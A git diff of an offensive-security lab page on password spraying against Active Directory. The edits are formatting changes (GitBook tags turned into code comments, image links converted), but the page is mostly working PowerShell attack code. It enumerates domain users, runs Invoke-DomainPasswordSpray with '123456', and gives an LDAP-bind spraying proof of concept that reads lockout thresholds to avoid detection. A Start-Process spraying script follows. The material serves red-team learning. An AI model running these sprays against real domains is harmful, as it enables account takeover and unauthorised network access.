@@ -4,35 +4,33 @@ This lab explores ways of password spraying against Active Directory accounts.
 
 ## Invoke-DomainSpray
 
-{% code title="attacker@victim" %}
 ```csharp
+// attacker@victim
 Get-ADUser -Properties name -Filter * | Select-Object -ExpandProperty name |  Out-File users.txt
 type users.txt
 ```
-{% endcode %}
 
-![](<../../.gitbook/assets/Screenshot from 2019-03-20 21-29-13.png>)
+![[Screenshot from 2019-03-20 21-29-13.png]]
 
-{% code title="attacker@victim" %}
 ```csharp
+// attacker@victim
 Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
 ```
-{% endcode %}
 
-![](<../../.gitbook/assets/Screenshot from 2019-03-20 21-32-37.png>)
+![[Screenshot from 2019-03-20 21-32-37.png]]
 
 ## Spraying using dsacls
 
 While I was poking around with dsacls for enumerating AD object permissions
 
-{% content-ref url="using-dsacls-to-check-ad-object-permissions.md" %}
+
 [using-dsacls-to-check-ad-object-permissions.md](using-dsacls-to-check-ad-object-permissions.md)
-{% endcontent-ref %}
+
 
 I noticed that one could attempt to bind to LDAP using specific AD credentials, so a dirty AD password spraying POC came about:
 
-{% code title="attacker@victim" %}
 ```csharp
+// attacker@victim
 $domain = ((cmd /c set u)[-3] -split "=")[-1]
 $pdc = ((nltest.exe /dcname:$domain) -split "\\\\")[1]
 $lockoutBadPwdCount = ((net accounts /domain)[7] -split ":" -replace " ","")[1]
@@ -51,16 +49,15 @@ $password = "123456"
     }
 }
 ```
-{% endcode %}
 
-![](<../../.gitbook/assets/Screenshot from 2019-03-20 00-10-10.png>)
+![[Screenshot from 2019-03-20 00-10-10.png]]
 
 ## Spraying with Start-Process
 
 Similarly to dsacls, it's possible to spray passwords with `Start-Process` cmdlet and the help of PowerView's cmdlets:
 
-{% code title="spray-ldap.ps1" %}
 ```csharp
+// spray-ldap.ps1
 # will spray only users that currently have 0 bad password attempts
 # dependency - powerview
 
@@ -89,17 +86,16 @@ Write-Host $users.Count users supplied; $users | % {
     }
 }
 ```
-{% endcode %}
 
 Enjoy the shells:
 
-![](../../.gitbook/assets/spraying.gif)
+![[spraying.gif]]
 
 ## References
 
-{% embed url="https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1" %}
+[github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1)
 
-{% embed url="https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon" %}
+[github.com/PowerShellMafia/PowerSploit/tree/master/Recon](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon)
 
 
 
